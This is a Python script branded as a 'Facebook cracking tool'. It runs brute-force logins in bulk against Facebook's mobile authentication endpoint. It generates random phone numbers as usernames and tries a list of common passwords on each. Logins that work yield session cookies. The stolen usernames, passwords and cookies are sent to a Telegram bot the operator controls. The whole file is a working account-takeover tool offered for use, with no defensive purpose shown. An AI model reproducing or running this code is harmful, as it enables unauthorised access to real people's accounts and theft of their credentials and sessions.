import os, sys, requests, random, json, time, uuid
from concurrent.futures import ThreadPoolExecutor as r
HH='\033[1;32m'  # أخضر لامع
M = '\x1b[1;36m'  # سماوي لامع
from datetime import datetime

# ================== قوائم User-Agent المضافة ==================
ugen2 = [
    # ===== Android (Mobile) =====
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Redmi Note 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36',
    # ===== iPhone =====
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/153.0.0.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/25.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/153.0 Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/152.0.0.0 Mobile/15E148 Safari/604.1',
    # ===== iPad =====
    'Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/153.0.0.0 Mobile/15E148 Safari/604.1',
]

ugen = [
    # ===== Chrome - Windows =====
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    # ===== Chrome - macOS =====
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    # ===== Chrome - Linux =====
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    # ===== Edge =====
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Edg/153.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36 Edg/152.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Edg/153.0.0.0',
    # ===== Firefox =====
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:153.0) Gecko/20100101 Firefox/153.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:152.0) Gecko/20100101 Firefox/152.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0',
    # ===== Safari macOS =====
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/25.0 Safari/605.1.15',
    # ===== Opera =====
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 OPR/118.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 OPR/118.0.0.0',
    # ===== Brave =====
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Brave/153',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Brave/153',
    # ===== Googlebot & Bingbot =====
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; Googlebot-Image/1.0; +http://www.google.com/bot.html)',
]

# دمج القائمتين لاختيار UA عشوائي
UA_LIST = ugen2 + ugen
# ===============================================================

G = "\033[1;32m"    # أخضر لامع
W = "\x1b[1;36m"    # سماوي لامع
B = "\033[1;34m"    # أزرق لامع
Y = "\033[1;33m"    # أصفر لامع
A = "\033[1;35m"    # بنفسجي لامع
R = "\033[1;31m"    # أحمر لامع
O = "\x1b[38;5;208m" # برتقالي
X = "\x1b[38;5;201m" # وردي
P = "\x1b[38;5;51m"  # أزرق فاتح

xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{Y}1{G}]>{W}"
xp2 = f"{G}<[{Y}2{G}]>{W}"
xp3 = f"{G}<[{Y}3{G}]>{W}"
xp4 = f"{G}<[{Y}4{G}]>{W}"
xp5 = f"{G}<[{Y}5{G}]>{W}"
xp0 = f"{G}<[{Y}0{G}]>{W}"
xpx = f"{G}<[{Y}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"
xlinex = (f"{G}━"*40)


id, ok, loop = [], 0, 0
android_versions = ["10", "11", "12", "13", "14"]
devices = [
    "TECNO CK7n",
    "Samsung SM-G991B",
    "Xiaomi Redmi Note 12",
    "Infinix X6812",
    "Huawei Y9a"
]
brands = {
    "TECNO CK7n": "TECNO",
    "Samsung SM-G991B": "Samsung",
    "Xiaomi Redmi Note 12": "Xiaomi",
    "Infinix X6812": "Infinix",
    "Huawei Y9a": "Huawei"
}
android = random.choice(android_versions)
device = random.choice(devices)
brand = brands[device]

fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
fbbv = random.randint(100000000, 999999999)

width = random.choice([720, 1080, 1440])
height = random.choice([1600, 1920, 2172, 2400])
density = random.choice([2.0, 2.5, 3.0, 4.0])

# ====== اختيار User-Agent عشوائي من القائمتين ======
ua = random.choice(UA_LIST)
# ================================================

headers = {
    "User-Agent": ua,
    "Accept-Encoding": "gzip, deflate",
    "x-fb-connection-quality": "EXCELLENT",
    "x-fb-friendly-name": "authenticate",
    "x-fb-http-engine": "Liger",
    "x-fb-client-ip": "True",
    "x-fb-server-cluster": "True",
    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}

Logo = f"""{G}
╔══════════════════════════════════════════════════════════╗
║  {Y}██████╗ ██╗██╗  ██╗███████╗██╗{G}                          ║
║  {Y}██╔══██╗██║██║ ██╔╝██╔════╝██║{G}                          ║
║  {Y}███████║██║█████╔╝ █████╗  ██║{G}                          ║
║  {Y}██╔══██║██║██╔═██╗ ██╔══╝  ██║{G}                          ║
║  {Y}██║  ██║██║██║  ██╗███████╗███████╗{G}                     ║
║  {Y}╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝{G}                     ║
╠══════════════════════════════════════════════════════════╣
║  {W}★ FACEBOOK CRACKING TOOL ★{G}                             ║
╠══════════════════════════════════════════════════════════╣
║  {A}◈ Developer {G}: {W}Mikel{G}                                     ║
║  {A}◈ Version   {G}: {W}v2.0 PRO{G}                                  ║
║  {A}◈ Platform  {G}: {W}Android 10 → 14{G}                           ║
║  {A}◈ Contact   {G}: {W}@Mikel1d{G}                                  ║
╠══════════════════════════════════════════════════════════╣
║  {R}© 2026 Mikel Tool - All Rights Reserved{G}                 ║
╚══════════════════════════════════════════════════════════╝
{W}"""

def send_telegram(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass

def get_cookies(uid, password):
    try:
        data = pm(uid, password)
        req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()
        if 'session_key' in req:
            cookies = ";".join([f"{key}={value}" for key, value in req.get('session_cookies', [{}])[0].items()])
            return cookies
        return ""
    except:
        return ""

def menu():
    global TOKEN, ID
    os.system('clear')
    print(Logo)
    
    TOKEN = input(f'{xp}  TOKEN {xpxx} ').strip()
    print(xlinex)
    
    ID = input(f'{xp} ID {xpxx} ').strip()
    print(xlinex)
    
    sim = input(f'{xp} INPUT CHOSE (0750 | 0770 | 0780) {xpxx} ')
    print(xlinex)
    
    for _ in range(44444):  
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        id.append(nmp)
    
    with r(max_workers=30) as am:
        os.system('clear')
        print(Logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [
    ids,
    str(idx),
    "hama1234",
    "zaxo1234",
    "zaxozaxo",
    "kurd1234",
    "muhamad123",
    "kurdkurd",
    "123123",
    "123123123",
    "1234567",
    "123456789",
    "qwerqwer",
    "zxcvzxcv",
    "aassdd",
    "10002000",
    "qqwweerrtt",
    "zzxxcc",
    "mmnnbb",
    "ppooii",
    "ppooiiuu",
    "vvccxxzz",
    "mmnnbbvvccxxzz",
    "llkkjjhhggffddssaa",
    "ppooiiuuyyttrreewwqq",
    "20232023",
    "20252025",
    "hhjjkkll",
    "aassddff",
    "aassddffgg",
    "qqwweerrttyyuuiioopp",
    "aassddffgghhjjkkll",
    "first last",
    "first 123",
    "first1234",
    "first 12345",
    "first2023",
    "first1995",
    "1020304050",
    "حسين حسين",
    "عبدالله الشمري",
    "خالد المشهوري",
    "مشكلجي مشكلجي",
    "عبدالله حسام",
]
            am.submit(crackfree, ids, pwxs)
    
    print('')
    print('\033[1;32m\033[1m-'*45)
    print('Crack Completed')
    exit()

def crackfree(ids, pwxs):
    global ok, loop
    sys.stdout.write(f'\r\r\r\033[1;36m\033[1m{xp} {G}<[{W}Mikel-{Y}{loop}{G}]> {G}<[{W}OK-{R}{ok}{G}]>'),
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()
            
            if 'session_key' in req:
                uid = req["uid"]
                ok += 1
                coki = get_cookies(ids, pw)
                
                print(f"\r\r\033[1;32m\033[1m{xp} {G}<[{Y}Mikel-OK{G}]> {W}{uid} {G}| {Y}{pw}   ")
                print(xlinex)
                
                m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

  حساب شغال ✅
⋘─────━𓅓Mikel𓅓─────━⋙ Mikel - @Mikel1d"""
                
                Mikel_m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

tg://openmessage?user_id={ID}
  حساب شغال ✅
⋘─────━𓅓Mikel𓅓─────━⋙ Mikel - @Mikel1d"""
                
                send_telegram(TOKEN, ID, m)
                send_telegram(TOKEN, ID, Mikel_m)
                
                break
                
            elif 'www.facebook.com' in req["error"]["message"]:
                uid = req["error"]["error_data"]["uid"]
                
                print(f"\r\r\x1b[1;31m\033[1m{xp}{G}<[{R}Mikel-CP{G}]>\033[1;33m {uid} {G}| {Y}{pw}   ")
                print(xlinex)
                
                m = f"""حساب سكيور ❌
⋘─────━𓅓Mikel𓅓─────━⋙     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

⋘─────━𓅓Mikel𓅓─────━⋙ Mikel - @Mikel1d"""
                
                Mikel_m = f"""حساب سكيور ❌
⋘─────━𓅓Mikel𓅓─────━⋙     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

tg://openmessage?user_id={ID}
⋘─────━𓅓Mikel𓅓─────━⋙ @Mikel1d"""
                
                send_telegram(TOKEN, ID, m)
                send_telegram(TOKEN, ID, Mikel_m)
                
                break
                
        except requests.exceptions.ConnectionError:
            time.sleep(1)
    
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

menu()